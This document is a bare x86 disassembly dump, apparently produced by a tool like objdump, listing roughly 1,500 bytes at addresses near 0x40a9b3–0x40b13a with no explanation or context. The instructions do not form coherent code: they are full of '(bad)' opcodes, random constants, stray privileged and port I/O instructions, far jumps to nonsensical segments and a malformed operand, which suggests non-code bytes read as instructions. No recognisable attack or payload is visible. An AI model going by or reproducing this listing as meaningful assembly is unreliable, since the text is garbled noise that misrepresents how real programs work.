  40a9b3:	test   eax,0x66b9116f
  40a9b8:	xor    al,0x79
  40a9ba:	jp     0x40a966
  40a9bc:	fdiv   st(3),st
  40a9be:	leave  
  40a9bf:	aaa    
  40a9c0:	and    eax,0x40bd83c9
  40a9c5:	mov    ch,0x19
  40a9c7:	mov    eax,0xdcf17ed2
  40a9cc:	repnz pop ecx
  40a9ce:	test   eax,0x93a2d7fa
  40a9d3:	bound  eax,QWORD PTR [edx-0x21]
  40a9d6:	loope  0x40a9d6
  40a9d8:	clc    
  40a9d9:	shl    DWORD PTR [ebp-0x11],cl
  40a9dc:	test   al,0x69
  40a9de:	push   edi
  40a9df:	mov    DWORD PTR [ebx],edx
  40a9e1:	mov    ds:0x3d12413c,eax
  40a9e6:	les    ebx,FWORD PTR [edx+0x2b5dc937]
  40a9ec:	adc    eax,0xc91c2971
  40a9f1:	and    dh,BYTE PTR [eax-0x33578d83]
  40a9f7:	fild   WORD PTR [ecx]
  40a9f9:	scas   al,BYTE PTR es:[edi]
  40a9fa:	fadd   st,st(7)
  40a9fc:	dec    ecx
  40a9fd:	mov    ch,0x8e
  40a9ff:	adc    eax,0xe447ddde
  40aa04:	xchg   ecx,eax
  40aa05:	lds    edi,FWORD PTR [edx+0x456b18f1]
  40aa0b:	je     0x40a9b3
  40aa0d:	push   esp
  40aa0e:	xor    al,0x4d
  40aa11:	push   eax
  40aa12:	mov    bh,0xa7
  40aa14:	sub    edx,DWORD PTR [edx]
  40aa16:	ins    BYTE PTR es:[edi],dx
  40aa17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa18:	or     al,0x87
  40aa1a:	frstor [ecx]
  40aa1c:	shl    DWORD PTR [edi-0x77d0bf41],1
  40aa22:	inc    esi
  40aa23:	mov    ds:0xdddb515e,eax
  40aa28:	pop    es
  40aa29:	lds    edi,FWORD PTR [edx]
  40aa2b:	fild   QWORD PTR [esi+0x16ef03dd]
  40aa31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa32:	sbb    DWORD PTR [edx],0x3
  40aa35:	jge    0x40a9ec
  40aa37:	hlt    
  40aa38:	mov    dh,0xeb
  40aa3a:	cmp    al,0x6c
  40aa3c:	xchg   ecx,eax
  40aa3d:	int3   
  40aa3e:	or     ch,cl
  40aa40:	sbb    esi,DWORD PTR [edi-0x69]
  40aa43:	pop    eax
  40aa44:	jl     0x40aa6d
  40aa46:	lahf   
  40aa47:	pop    es
  40aa48:	div    BYTE PTR [eax]
  40aa4a:	push   esp
  40aa4b:	xchg   ebp,eax
  40aa4c:	sbb    BYTE PTR [ecx+0x7d342b95],dh
  40aa52:	sub    BYTE PTR [edx+0x1d],al
  40aa55:	cmp    ebx,DWORD PTR [ebx+0x3f]
  40aa58:	sbb    al,0xf
  40aa5a:	jno    0x40aa46
  40aa5c:	jae    0x40aaa3
  40aa5e:	dec    esi
  40aa5f:	dec    esp
  40aa60:	jecxz  0x40aa72
  40aa62:	mov    al,ds:0x707843fb
  40aa67:	fidiv  DWORD PTR ds:0x79076607
  40aa6d:	shl    DWORD PTR [ecx],1
  40aa6f:	in     al,dx
  40aa70:	fst    st(3)
  40aa72:	pop    ebx
  40aa73:	inc    ebp
  40aa74:	in     al,dx
  40aa75:	jns    0x40aa26
  40aa77:	pop    ebx
  40aa78:	mov    al,0xf4
  40aa7a:	xchg   ebp,eax
  40aa7b:	addr16 inc edi
  40aa7d:	sbb    DWORD PTR [eax-0x6fc9dba5],esp
  40aa83:	xor    eax,DWORD PTR [ecx]
  40aa85:	mov    edx,0x2e4abe34
  40aa8a:	jnp    0x40aa4d
  40aa8c:	push   esp
  40aa8d:	mov    cl,0xe6
  40aa90:	jb     0x40aa15
  40aa92:	jmp    0x9e764c04
  40aa97:	fst    QWORD PTR [ebx+0x443d1174]
  40aa9d:	pop    es
  40aa9e:	bound  eax,QWORD PTR [ebp+0x3e]
  40aaa1:	cmp    BYTE PTR [edi+esi*1+0x7a2ad87c],bh
  40aaa8:	dec    esp
  40aaa9:	mov    dh,0xf9
  40aaab:	out    0x1d,al
  40aaad:	xchg   bh,dh
  40aaaf:	push   esi
  40aab0:	lea    esi,[ebx+0x5f]
  40aab3:	jne    0x40aa43
  40aab5:	test   BYTE PTR [ecx],cl
  40aab7:	jmp    0x399f:0x444c4218
  40aabe:	adc    al,0x2e
  40aac0:	fisub  WORD PTR [ebp+0x4b]
  40aac3:	push   ds
  40aac4:	pop    edi
  40aac5:	loopne 0x40ab2b
  40aac7:	std    
  40aac8:	fcmovnu st,st(1)
  40aaca:	jl     0x40aad2
  40aacc:	dec    ebx
  40aacd:	ja     0x40aa6d
  40aacf:	jno    0x40ab36
  40aad1:	aaa    
  40aad2:	sbb    ah,BYTE PTR [ebx]
  40aad4:	icebp  
  40aad5:	mov    ch,0x95
  40aad7:	pop    esi
  40aad8:	sahf   
  40aad9:	cli    
  40aada:	neg    BYTE PTR [eax-0x44ef1d2e]
  40aae0:	add    al,0xe4
  40aae2:	pop    ds
  40aae3:	pop    es
  40aae4:	push   eax
  40aae5:	cmp    BYTE PTR [eax+ebx*1-0x33],cl
  40aae9:	inc    ebx
  40aaea:	retf   
  40aaeb:	sbb    dh,ah
  40aaed:	xchg   esp,eax
  40aaee:	rol    DWORD PTR [ebp-0x12],1
  40aaf1:	arpl   WORD PTR [edx+0xdd4e1b6],di
  40aaf7:	mov    BYTE PTR [edx-0x69],0xef
  40aafb:	push   es
  40aafc:	call   0xf6e88a7
  40ab01:	ficom  DWORD PTR [ebp+0x129c6a75]
  40ab07:	outs   dx,DWORD PTR ds:[esi]
  40ab08:	cli    
  40ab09:	cmp    al,0x32
  40ab0b:	int    0x28
  40ab0d:	inc    eax
  40ab0e:	js     0x40aa96
  40ab10:	mov    ?,esi
  40ab12:	sbb    eax,0xd128c588
  40ab17:	jmp    0x5881271c
  40ab1c:	mov    ds:0x15759a3a,al
  40ab21:	push   ecx
  40ab22:	cmp    dh,BYTE PTR [eax]
  40ab24:	push   es
  40ab25:	push   0xdc2c1ba4
  40ab2a:	xor    eax,0xad53a5f6
  40ab2f:	(bad)  [edx+0x2b]
  40ab32:	imul   esp,DWORD PTR [eax-0x24],0x71d4f90b
  40ab39:	stos   DWORD PTR es:[edi],eax
  40ab3a:	mov    ah,0x71
  40ab3c:	jecxz  0x40ab5c
  40ab3e:	xor    al,0x8
  40ab40:	icebp  
  40ab41:	jg     0x40aacf
  40ab43:	aad    0x85
  40ab45:	std    
  40ab46:	inc    edx
  40ab47:	(bad)  
  40ab48:	(bad)  
  40ab49:	adc    ax,0x9310
  40ab4d:	sar    BYTE PTR ds:0xf997d5fb,0x3a
  40ab54:	push   ds
  40ab55:	mov    ebx,0xce82dbdc
  40ab5a:	push   ecx
  40ab5b:	lods   eax,DWORD PTR ds:[esi]
  40ab5c:	(bad)  
  40ab5d:	sbb    DWORD PTR [ecx+edx*2],eax
  40ab60:	test   BYTE PTR [eax+edx*1-0x21],al
  40ab64:	pushf  
  40ab65:	out    0x3e,eax
  40ab67:	mov    edx,0x272ca698
  40ab6c:	adc    eax,0xfcbbe5d9
  40ab71:	cmp    edi,DWORD PTR [edx+0x2]
  40ab74:	push   ebx
  40ab76:	xchg   BYTE PTR [esi],bl
  40ab78:	jnp    0x40ab9f
  40ab7a:	adc    DWORD PTR [edi],edx
  40ab7c:	add    eax,0x51aa1ca
  40ab81:	push   eax
  40ab82:	fcomi  st,st(6)
  40ab84:	push   ecx
  40ab85:	push   edi
  40ab86:	scas   al,BYTE PTR es:[edi]
  40ab87:	retf   
  40ab88:	ins    DWORD PTR es:[edi],dx
  40ab89:	addr16 in al,0x3f
  40ab8c:	mov    ch,0x84
  40ab8e:	aad    0x93
  40ab90:	leave  
  40ab91:	and    eax,0xa1685d19
  40ab96:	mov    edx,0xfd496a5a
  40ab9b:	sub    eax,0x89bfe5aa
  40aba0:	add    cx,WORD PTR [edx]
  40aba3:	push   ds
  40aba4:	inc    esi
  40aba5:	inc    esp
  40aba6:	std    
  40aba7:	or     esi,edi
  40aba9:	lods   eax,DWORD PTR ds:[esi]
  40abaa:	mov    al,BYTE PTR [ebp+0x7d317d5f]
  40abb0:	dec    esp
  40abb1:	mov    cl,0xef
  40abb3:	cld    
  40abb4:	add    dl,BYTE PTR [edx+0x36]
  40abb7:	push   ebp
  40abb8:	add    edi,DWORD PTR [ebp+edi*2+0x55]
  40abbc:	test   eax,0x8c840a25
  40abc1:	js     0x40ac3b
  40abc3:	add    esp,ebp
  40abc5:	addr16 or eax,0x270bfb72
  40abcb:	push   ecx
  40abcc:	sub    edi,DWORD PTR gs:[esi*4+0x60b95a9]
  40abd4:	jb     0x40ab57
  40abd6:	xchg   edx,eax
  40abd7:	cmc    
  40abd8:	sbb    eax,0x49c19a62
  40abdd:	loopne 0x40ac10
  40abdf:	dec    eax
  40abe0:	adc    edx,esi
  40abe2:	sbb    cl,BYTE PTR [ebp-0x307c72db]
  40abe8:	push   edi
  40abe9:	xor    BYTE PTR [eax-0x16],dl
  40abec:	sub    eax,ecx
  40abee:	aam    0xe
  40abf0:	sti    
  40abf1:	mov    eax,0x43c63097
  40abf6:	cli    
  40abf7:	jae    0x40ac39
  40abf9:	test   al,0xdf
  40abfb:	imul   esi,edi,0x26
  40abfe:	ror    DWORD PTR [eax+0x626d6a9],cl
  40ac04:	shl    esp,1
  40ac06:	arpl   WORD PTR [ebx+0x68],di
  40ac09:	add    BYTE PTR [ecx+0x3ab3a3c5],bh
  40ac0f:	inc    ebp
  40ac10:	push   ebx
  40ac11:	test   eax,0x5a5bfe3c
  40ac16:	xor    al,0xfa
  40ac18:	add    dh,BYTE PTR [edx-0x2733ad5]
  40ac1e:	jae    0x40abe3
  40ac20:	xor    DWORD PTR ds:0x4b345c63,ebx
  40ac26:	repz cmp edi,DWORD PTR [ecx+ecx*8-0x2e6b7ef]
  40ac2e:	cmp    al,0x3c
  40ac30:	(bad)  
  40ac31:	mov    esi,0x6329aadb
  40ac36:	dec    edi
  40ac37:	mov    edx,0x7ac16a08
  40ac3c:	(bad)  
  40ac3d:	int3   
  40ac3e:	pop    es
  40ac3f:	lods   al,BYTE PTR ds:[esi]
  40ac40:	add    BYTE PTR [edi+eax*2-0x53762053],al
  40ac47:	inc    eax
  40ac48:	call   0x2477cf5d
  40ac4d:	jl     0x40abfc
  40ac4f:	aas    
  40ac50:	dec    ecx
  40ac51:	add    DWORD PTR [ebx+0x6c],esi
  40ac54:	or     eax,0xff52553
  40ac59:	cmp    eax,DWORD PTR ds:[ebx]
  40ac5c:	push   0x3036f43b
  40ac61:	imul   esi,ecx,0x9a8f688b
  40ac67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac68:	dec    edx
  40ac69:	addr16 mov esi,0x88a911c0
  40ac6f:	gs jl  0x40ac24
  40ac72:	mov    ah,0xbd
  40ac74:	pop    esi
  40ac75:	mov    ds:0x6dd235f6,al
  40ac7a:	mov    al,0x3f
  40ac7c:	ret    
  40ac7d:	je     0x40ac27
  40ac7f:	dec    edx
  40ac80:	lods   al,BYTE PTR ds:[esi]
  40ac81:	jmp    0xe31af739
  40ac86:	pop    ds
  40ac87:	add    DWORD PTR [ecx+0x22],esp
  40ac8a:	nop
  40ac8b:	xor    edx,DWORD PTR [ecx-0x23]
  40ac8e:	rcr    ch,1
  40ac90:	clc    
  40ac91:	mov    dh,0xde
  40ac93:	mov    edx,0xae8b8e63
  40ac98:	sahf   
  40ac99:	cmp    al,cl
  40ac9b:	fdiv   DWORD PTR [eax-0x29d54947]
  40aca1:	xchg   edx,eax
  40aca2:	push   edi
  40aca3:	aam    0x90
  40aca5:	fdiv   DWORD PTR [ebx]
  40aca7:	mov    ebx,0x28c9360
  40acac:	push   eax
  40acad:	adc    DWORD PTR ds:0x53adc7e8,ebx
  40acb3:	jp     0x40ac5e
  40acb5:	sbb    edi,DWORD PTR [esi-0x5b]
  40acb8:	mov    bh,0x36
  40acba:	xor    dl,BYTE PTR [esi]
  40acbc:	mov    bh,0x1c
  40acbe:	int3   
  40acbf:	cwde   
  40acc0:	xchg   esi,eax
  40acc1:	xchg   edx,eax
  40acc2:	mov    dl,0xe0
  40acc4:	jmp    0xb25f:0xb63d0e06
  40accb:	xchg   esp,eax
  40accc:	adc    ebp,eax
  40acce:	cwde   
  40accf:	jg     0x40acbb
  40acd1:	xor    al,0xd8
  40acd3:	mov    al,ds:0x99d0511
  40acd8:	sahf   
  40acd9:	in     eax,dx
  40acda:	pop    ecx
  40acdb:	or     eax,eax
  40acdd:	je     0x40ac8c
  40acdf:	fdivr  DWORD PTR [ecx+0x4740e7f8]
  40ace5:	je     0x40ac80
  40ace7:	adc    eax,0x4e0c5a67
  40acec:	outs   dx,DWORD PTR ds:[esi]
  40aced:	xor    edi,DWORD PTR [edx]
  40acef:	pop    edi
  40acf0:	jns    0x40ad1d
  40acf2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40acf3:	mov    dl,0x9a
  40acf5:	arpl   si,dx
  40acf7:	aad    0x7c
  40acf9:	or     al,0x5a
  40acfb:	sub    eax,0x9c692bcb
  40ad00:	add    al,0xf5
  40ad02:	mov    ah,0x9c
  40ad04:	sbb    ebx,DWORD PTR [edx-0x4e35c260]
  40ad0a:	pop    es
  40ad0b:	mov    dl,ah
  40ad0d:	fwait
  40ad0e:	jb     0x40acf0
  40ad10:	push   ecx
  40ad11:	vmread DWORD PTR [ebx+0x698b9d5b],esp
  40ad18:	fmul   st,st(7)
  40ad1a:	ds out 0xae,eax
  40ad1d:	loope  0x40ad09
  40ad1f:	inc    edx
  40ad20:	scas   al,BYTE PTR es:[edi]
  40ad21:	add    dl,bl
  40ad23:	loopne 0x40ad9b
  40ad25:	pushf  
  40ad26:	pop    edi
  40ad27:	pop    eax
  40ad28:	stos   BYTE PTR es:[edi],al
  40ad29:	nop
  40ad2a:	(bad)  
  40ad2b:	out    dx,eax
  40ad2c:	jne    0x40ad75
  40ad2e:	lds    edx,FWORD PTR [ecx-0x4ddc518d]
  40ad34:	inc    ebx
  40ad35:	mov    ecx,DWORD PTR [esi+0x7e]
  40ad38:	xlat   BYTE PTR ds:[ebx]
  40ad39:	mov    ds:0xb7f27fc9,al
  40ad3e:	or     DWORD PTR [edx],ebp
  40ad40:	mov    ebp,0x236a0c2b
  40ad45:	adc    cl,0x4d
  40ad48:	jno    0x40ace8
  40ad4a:	out    dx,al
  40ad4b:	jo     0x40ad2a
  40ad4d:	adc    edx,DWORD PTR [edx]
  40ad4f:	mov    ch,0xd2
  40ad51:	stc    
  40ad52:	mov    edi,DWORD PTR [ebx+0x2c]
  40ad55:	mov    esp,0x9bd79fc6
  40ad5a:	hlt    
  40ad5b:	adc    al,0x14
  40ad5d:	je     0x40ad1b
  40ad5f:	fs push ds
  40ad61:	test   eax,0xb56783f7
  40ad66:	sub    edx,edx
  40ad68:	push   eax
  40ad69:	ins    DWORD PTR es:[edi],dx
  40ad6a:	add    eax,DWORD PTR [edi-0x76ca5be]
  40ad70:	int3   
  40ad71:	(bad)  
  40ad72:	sti    
  40ad73:	retf   
  40ad74:	std    
  40ad75:	mul    BYTE PTR [ebx]
  40ad77:	xchg   edx,eax
  40ad78:	mov    ebx,0x68a7428f
  40ad7d:	not    sp
  40ad80:	lds    esp,FWORD PTR gs:[edx+0x5b]
  40ad84:	mov    al,ds:0x5c37b763
  40ad89:	shl    DWORD PTR [eax],cl
  40ad8b:	aam    0x0
  40ad8d:	dec    edi
  40ad8e:	loope  0x40addd
  40ad90:	mov    BYTE PTR [edi+ebx*8+0x2df520e5],bl
  40ad97:	(bad)  [esi-0x7ffc43ad]
  40ad9d:	push   ebp
  40ad9e:	sahf   
  40ad9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ada0:	jne    0x40ae1b
  40ada2:	rcr    DWORD PTR [esi+ebp*1-0x63],cl
  40ada6:	cmp    BYTE PTR [eax],dh
  40ada8:	dec    edi
  40ada9:	xchg   BYTE PTR [esp+ebx*1-0x60],dh
  40adad:	push   esp
  40adae:	ja     0x40ae01
  40adb0:	std    
  40adb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40adb2:	pop    es
  40adb3:	or     ebp,ebp
  40adb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40adb6:	and    eax,DWORD PTR [edi-0x2085021e]
  40adbc:	retf   
  40adbd:	mov    esi,0x8d31dd95
  40adc2:	sbb    BYTE PTR [ecx-0x78da20e2],0x20
  40adc9:	mov    BYTE PTR [ecx],bh
  40adcb:	int3   
  40adcc:	add    DWORD PTR [eax+eiz*2],0x15ccb7f2
  40add3:	push   cs
  40add4:	xor    BYTE PTR [ebx+0xc83d89d],dh
  40adda:	inc    esp
  40addb:	fwait
  40addc:	push   eax
  40addd:	push   edx
  40adde:	int    0x18
  40ade0:	sbb    eax,0xc9d78892
  40ade5:	adc    DWORD PTR [eax+edx*4+0x6b],esi
  40ade9:	xchg   edx,eax
  40adea:	daa    
  40adeb:	dec    edi
  40adec:	adc    eax,0x2574b7b7
  40adf1:	lods   al,BYTE PTR ds:[esi]
  40adf2:	ins    DWORD PTR es:[edi],dx
  40adf3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40adf4:	sub    al,0x98
  40adf6:	js     0x40adef
  40adf8:	es dec esi
  40adfa:	add    ebp,ebx
  40adfc:	adc    eax,0x86cc9416
  40ae01:	dec    esi
  40ae02:	pop    es
  40ae03:	push   eax
  40ae04:	(bad)  
  40ae05:	adc    esi,DWORD PTR [edi+0x45]
  40ae08:	sar    DWORD PTR [esi-0x1040a22f],0xee
  40ae0f:	and    al,BYTE PTR ds:[esi+0x2c4442f4]
  40ae16:	outs   dx,DWORD PTR ds:[esi]
  40ae17:	pop    ebp
  40ae18:	or     al,0xf8
  40ae1a:	fiadd  WORD PTR [ebp+0x2696c583]
  40ae20:	popf   
  40ae21:	or     eax,0xc8f5356c
  40ae26:	or     edi,DWORD PTR [ebp+0x9d097b2]
  40ae2c:	push   es
  40ae2d:	loop   0x40ae79
  40ae2f:	inc    ecx
  40ae30:	xchg   bl,dh
  40ae32:	mov    edx,0x733afdec
  40ae37:	out    dx,al
  40ae38:	fcomp  DWORD PTR [ebx]
  40ae3a:	loop   0x40ae91
  40ae3c:	cli    
  40ae3d:	call   0xbcbaf3b7
  40ae42:	add    al,BYTE PTR [esi]
  40ae44:	xchg   edx,eax
  40ae45:	inc    BYTE PTR [esi+0x62]
  40ae48:	(bad)  
  40ae49:	mov    bl,0xcf
  40ae4b:	mov    ch,0x5c
  40ae4d:	out    dx,eax
  40ae4e:	sub    al,0xc4
  40ae50:	outs   dx,BYTE PTR ds:[esi]
  40ae51:	aas    
  40ae52:	push   edi
  40ae53:	push   esi
  40ae54:	jns    0x40ae44
  40ae56:	pop    fs
  40ae58:	scas   eax,DWORD PTR es:[edi]
  40ae59:	pop    esi
  40ae5a:	std    
  40ae5b:	lods   al,BYTE PTR ds:[esi]
  40ae5c:	pop    ss
  40ae5d:	sbb    al,0x17
  40ae5f:	ror    BYTE PTR ss:[ebx+0x7ae4c66a],1
  40ae66:	std    
  40ae67:	mov    al,0x4e
  40ae69:	in     al,dx
  40ae6a:	mov    ds:0x9619370f,eax
  40ae6f:	shr    DWORD PTR [ecx],0x51
  40ae72:	push   ss
  40ae73:	das    
  40ae74:	mov    cl,0x6b
  40ae76:	hlt    
  40ae77:	gs xchg ebx,eax
  40ae79:	(bad)  
  40ae7a:	lea    edi,[ecx+0x73]
  40ae7d:	xchg   ecx,eax
  40ae7e:	pop    ebx
  40ae7f:	inc    esp
  40ae80:	or     eax,0xba094c02
  40ae85:	nop
  40ae86:	or     DWORD PTR [edi],0x5d
  40ae89:	adc    ch,BYTE PTR [edx+ebx*2+0x54]
  40ae8d:	sar    BYTE PTR [ebp-0x32612006],0xac
  40ae94:	fs or  eax,0x1a89542c
  40ae9a:	loopne 0x40aebc
  40ae9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae9d:	sub    esp,DWORD PTR [esi+0x1d]
  40aea0:	xchg   BYTE PTR [ebx],ch
  40aea2:	jo     0x40ae95
  40aea4:	fld    QWORD PTR ds:0x2d2139ca
  40aeaa:	push   0xbd45ee6a
  40aeaf:	adc    eax,0x7878c206
  40aeb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aeb5:	(bad)  
  40aeb6:	repz lahf 
  40aeb8:	stc    
  40aeb9:	leave  
  40aeba:	sub    cl,ah
  40aebc:	(bad)  
  40aebd:	idiv   DWORD PTR [esi-0x58b9392e]
  40aec3:	cld    
  40aec4:	jmp    0x40ae50
  40aec6:	ss push ebp
  40aec8:	aad    0x6f
  40aeca:	xchg   esp,eax
  40aecb:	test   BYTE PTR [esi+0x6bf1e7c0],al
  40aed1:	fimul  WORD PTR [ebp-0x16]
  40aed4:	add    eax,0x5c8768c
  40aed9:	xor    BYTE PTR [esp+eax*8-0x20],al
  40aedd:	scas   al,BYTE PTR es:[edi]
  40aede:	fcom   QWORD PTR [edi+0x247cbdc3]
  40aee4:	int3   
  40aee5:	daa    
  40aee6:	jp     0x40af01
  40aee8:	arpl   WORD PTR cs:[edx-0x6bc82f89],bx
  40aeef:	leave  
  40aef0:	xchg   ebp,eax
  40aef1:	and    esi,DWORD PTR [esi+esi*4+0x7b972993]
  40aef8:	xchg   edx,eax
  40aef9:	imul   eax,DWORD PTR [ebx-0x2],0xffffff8d
  40aefd:	and    edi,DWORD PTR [ecx+0x64]
  40af00:	inc    ebx
  40af01:	xchg   edi,eax
  40af02:	xchg   BYTE PTR [eax+edi*1-0xe282529],bl
  40af09:	jle    0x40aeb8
  40af0b:	mov    edx,0xff4f3420
  40af10:	call   0x3075b447
  40af15:	call   0xdb192ceb
  40af1a:	push   cs
  40af1b:	xchg   edi,eax
  40af1c:	(bad)  
  40af1d:	mov    eax,0x5170ea06
  40af22:	inc    esi
  40af23:	repnz mov edi,0x5cbf93f4
  40af29:	inc    ecx
  40af2a:	sub    BYTE PTR [eax-0x5],dl
  40af2d:	ss in  eax,0x4f
  40af30:	in     eax,0x90
  40af32:	mov    esp,0xd11d2a9c
  40af37:	mov    ch,0xd9
  40af39:	fmul   st(2),st
  40af3b:	std    
  40af3c:	push   esp
  40af3d:	test   al,0xeb
  40af3f:	or     eax,0x1a484aa5
  40af44:	xor    ah,bl
  40af46:	and    DWORD PTR [esi+edx*8],edx
  40af49:	mov    eax,ds:0xdac7a411
  40af4e:	add    al,0xea
  40af50:	pop    ebx
  40af51:	aad    0xac
  40af53:	jecxz  0x40aed9
  40af55:	and    esp,DWORD PTR [esp+esi*4+0x7f]
  40af59:	jmp    0x5712279
  40af5e:	lods   eax,DWORD PTR ds:[esi]
  40af5f:	inc    ebp
  40af60:	cmp    ecx,DWORD PTR [ebp-0x4e]
  40af63:	jnp    0x40aee6
  40af65:	mov    al,0xb
  40af67:	jge    0x40af88
  40af69:	mov    eax,0xfaf94d8f
  40af6e:	adc    DWORD PTR [eax],0xffffffbe
  40af71:	xchg   ebx,eax
  40af72:	lods   al,BYTE PTR fs:[esi]
  40af74:	or     BYTE PTR [edx],dh
  40af76:	mov    DWORD PTR [edi],esi
  40af78:	adc    BYTE PTR [ebp-0x6d],0x3e
  40af7c:	dec    ecx
  40af7d:	and    al,0x0
  40af7f:	jmp    0x98a567fd
  40af84:	pop    esp
  40af85:	add    eax,0x3420c4e4
  40af8a:	pop    esi
  40af8b:	aad    0x55
  40af8d:	cs xor al,0xbb
  40af90:	or     al,0xc5
  40af92:	(bad)  
  40af93:	icebp  
  40af94:	cld    
  40af95:	stos   DWORD PTR es:[edi],eax
  40af96:	add    BYTE PTR [esi-0x6c],0x9d
  40af9a:	sub    BYTE PTR [edx],bh
  40af9c:	mov    ebp,0xca0c2695
  40afa1:	test   DWORD PTR [ecx-0x64734482],0x64ff5267
  40afab:	fs mov cl,0x47
  40afae:	mov    dl,0x4e
  40afb0:	jmp    0x40af5d
  40afb2:	int    0xef
  40afb4:	or     al,al
  40afb6:	jmp    0x2544:0xdb5b581b
  40afbd:	and    DWORD PTR [eax],ecx
  40afbf:	pop    es
  40afc0:	and    eax,0xa79549d0
  40afc5:	jo     0x40afb4
  40afc7:	mov    edx,0xd53a711f
  40afcc:	dec    esi
  40afcd:	call   0x5d3646ac
  40afd2:	dec    ecx
  40afd3:	cdq    
  40afd4:	sar    BYTE PTR ds:0x452d901d,1
  40afda:	xchg   ebp,eax
  40afdb:	retf   
  40afdc:	add    DWORD PTR fs:[ebp-0x35815408],esi
  40afe3:	aaa    
  40afe4:	iret   
  40afe5:	fcmovnb st,st(2)
  40afe7:	and    al,0x28
  40afe9:	out    dx,eax
  40afea:	push   ecx
  40afeb:	nop
  40afec:	sub    BYTE PTR [edi+0x4aa35023],cl
  40aff2:	clc    
  40aff3:	jmp    0x37ac8197
  40aff8:	push   es
  40aff9:	fwait
  40affa:	add    BYTE PTR [ebp-0x730cb061],0x9b
  40b001:	mov    al,al
  40b003:	xor    BYTE PTR [edx-0x15],dl
  40b006:	(bad)  
  40b007:	clc    
  40b008:	mov    ch,0xf1
  40b00a:	aas    
  40b00b:	sub    edi,ebx
  40b00d:	xor    edx,DWORD PTR [ebx]
  40b00f:	sub    BYTE PTR [ecx],dh
  40b011:	jns    0x40b039
  40b013:	fistp  QWORD PTR [ecx]
  40b015:	(bad)  
  40b016:	(bad)  
  40b017:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b018:	jg     0x40b086
  40b01a:	push   es
  40b01b:	jae    0x40aff8
  40b01d:	or     eax,0x897eeeea
  40b022:	in     eax,0xec
  40b024:	in     ax,0xf5
  40b027:	inc    BYTE PTR [ecx+0x17]
  40b02a:	xor    dl,dh
  40b02c:	jo     0x40b099
  40b02e:	jns    0x40b00c
  40b030:	push   es
  40b031:	and    DWORD PTR [esi+0x77],ebx
  40b034:	loopne 0x40afcd
  40b036:	mul    DWORD PTR [ebx]
  40b038:	xor    eax,0x9d8c49a1
  40b03d:	repnz (bad) 
  40b03f:	ds xor al,0xb4
  40b042:	cmp    DWORD PTR [ecx+0x1c08ca68],esi
  40b048:	dec    ecx
  40b049:	mov    eax,ds:0x3832c439
  40b04e:	fnstenv [eax+0x65a766cd]
  40b054:	es test al,0x4a
  40b057:	in     al,dx
  40b058:	xchg   DWORD PTR [ecx],ebp
  40b05a:	push   ss
  40b05b:	outs   dx,BYTE PTR ds:[esi]
  40b05c:	sbb    eax,0x86ba6532
  40b061:	(bad)  
  40b062:	adc    DWORD PTR [esp+edi*4+0x20711648],edx
  40b069:	mov    al,0x35
  40b06b:	or     BYTE PTR [edx+0x28],bl
  40b06e:	shl    BYTE PTR [ebx-0x2cca66ca],cl
  40b074:	nop
  40b075:	(bad)  
  40b076:	cdq    
  40b077:	push   esp
  40b078:	xlat   BYTE PTR ds:[ebx]
  40b079:	arpl   ax,bx
  40b07b:	vpsadbw xmm7,xmm2,XMMWORD PTR [eax]
  40b07f:	xchg   DWORD PTR [edi],esp
  40b081:	jb     0x40b02e
  40b083:	jmp    0x29d2:0xa4b13305
  40b08a:	xor    dl,ah
  40b08c:	jne    0x40b0eb
  40b08e:	icebp  
  40b08f:	mov    dl,0x83
  40b091:	inc    eax
  40b092:	test   BYTE PTR [ebx],0x89
  40b095:	push   0x76
  40b097:	cwde   
  40b098:	pushf  
  40b099:	jg     0x40b07e
  40b09b:	stos   BYTE PTR es:[edi],al
  40b09c:	xor    al,0x1e
  40b09e:	inc    esp
  40b09f:	jb     0x40b021
  40b0a1:	pop    esp
  40b0a2:	and    eax,0x9dd0f523
  40b0a7:	fisttp DWORD PTR [edi-0x79]
  40b0aa:	call   0x8b09349d
  40b0af:	sub    eax,0x559797f9
  40b0b4:	bound  edx,QWORD PTR [ecx+eiz*1+0x38208c08]
  40b0bb:	mov    ds:0x8fd91973,al
  40b0c0:	jle    0x40b0ed
  40b0c2:	(bad)  
  40b0c3:	mov    ebp,0xd046ae75
  40b0c8:	adc    BYTE PTR [esi-0x55fe2a93],dh
  40b0ce:	cmp    DWORD PTR [edx],edi
  40b0d0:	or     ebp,eax
  40b0d2:	adc    esp,DWORD PTR [esi*8-0xde2170d]
  40b0d9:	mov    ch,0xd9
  40b0db:	jmp    0xcdcee13f
  40b0e0:	lods   al,BYTE PTR ds:[esi]
  40b0e1:	xlat   BYTE PTR ds:[ebx]
  40b0e2:	mov    edx,0x37d31f5e
  40b0e7:	mov    ebx,DWORD PTR [ecx+0x68d7166f]
  40b0ed:	cld    
  40b0ee:	enter  0xb9fa,0x37
  40b0f2:	or     BYTE PTR [edi+0x5],ch
  40b0f5:	pop    esi
  40b0f6:	lahf   
  40b0f7:	shl    BYTE PTR [esi+ecx*2-0x2d7b2c6f],cl
  40b0fe:	retf   0xb664
  40b101:	retf   0xbe71
  40b104:	cs sbb eax,0x7f34b8ab
  40b10a:	ins    DWORD PTR es:[edi],dx
  40b10b:	in     al,0x29
  40b10d:	mov    bh,0x56
  40b10f:	hlt    
  40b110:	(bad)  
  40b111:	xchg   edi,eax
  40b112:	retf   0x3824
  40b115:	ret    0x2646
  40b118:	imul   esi,ecx,0xffffff84
  40b11b:	lods   eax,DWORD PTR ds:[esi]
  40b11c:	(bad)  
  40b11d:	imul   ebp,DWORD PTR [edx*2+0x6203a1a6],0x75543e4f
  40b128:	iret   
  40b129:	aad    0xe8
  40b12b:	mov    cl,0x36
  40b12d:	inc    ecx
  40b12e:	bound  ebx,QWORD PTR [eax-0x5a7f6a1c]
  40b134:	add    eax,0xb448e253
  40b139:	(bad)  
  40b13a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
